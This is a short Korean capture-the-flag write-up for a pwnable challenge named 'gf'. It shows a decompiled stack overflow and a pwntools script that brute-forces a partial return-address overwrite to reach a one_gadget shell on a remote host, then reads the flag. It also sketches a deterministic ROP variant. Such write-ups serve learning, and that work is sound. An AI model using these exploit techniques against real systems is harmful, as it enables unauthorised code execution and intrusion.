pwnable은 1문제였고, 풀었다.

# gf

```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char dest[16]; // [rsp+10h] [rbp-10h] BYREF

  sub_4011A5(a1, a2, a3);
  read(0, &unk_404060, 0xBCuLL);
  memcpy(dest, &unk_404060, 0xBBuLL);
  return 1LL;
}
```

스택에 0xBB 만큼 입력할 수 있다. 그런데 이러면 libc 하위 3바이트를 overwrite 하는 꼴이다. 원가젯의 하위 1.5바이트는 고정적이므로, 나머지 1.5바이트 브루트포스, 즉 1/4096 브루트포스로 해결할 수 있다. 쓰레드를 안 쓰고 로컬에서는 10분, 리모트에서는 30분 걸렸다.

## Exploit

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

bss = 0x404510
ret = 0x40101a
rax_0 = 0x40113F

'''
0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''
'''
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''
i = 0

while True:
  i += 1
  print(i)
  if i == 1000 : exit()
  try:
    p = remote('43.201.60.155', 1111)
    payload = b'a' * 0x10 + p64(bss) + p64(rax_0) + p64(ret) * 19 + p64(0x80bd3f)[:3]
    p.send(payload)
    p.sendline(b'cat flag')
    msg = p.recvline()
    print(msg)
    if b'*** stack' in msg or b'free()' in msg or b'int_mallinfo(): unaligned fastbin chunk detected' in msg or b'____strtod_l_internal: Assertion' in msg or b' __gconv_transform_ascii_internal:' in msg or b' _mid_memalign: Assertion ' in msg or b'hunix_create: out of ' in msg or b'realloc(): invalid pointe' in msg:
        p.close()
        continue
    p.interactive()
    p.close()
  except:
    p.close()
```

---

rbx control을 쓰면 확정적으로 익스 가능하다고 하다. bss로 rbp를 옮기고, 다른 함수를 사용하면서 남은 libc 주소를 이용하는 아이디어로,

```bash
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

가젯으로 one\_gadget을 만들 수 있다.